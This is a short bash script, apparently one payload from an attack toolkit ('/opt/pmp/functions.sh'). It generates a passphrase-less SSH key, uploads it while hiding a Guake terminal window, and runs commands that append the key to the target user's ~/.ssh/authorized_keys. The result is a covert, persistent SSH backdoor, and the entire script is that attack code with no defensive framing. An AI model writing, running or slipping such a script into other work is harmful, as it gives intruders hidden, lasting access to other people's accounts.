#!/bin/bash

source "/opt/pmp/functions.sh"

yes y | ssh-keygen -f $(pwd)/sshkey -N ""
upload_file.sh $(pwd)/sshkey.pub         # this will call hide_guake
command "mkdir -p ~/.ssh/"
command "cat /dev/shm/sshkey.pub >> ~/.ssh/authorized_keys"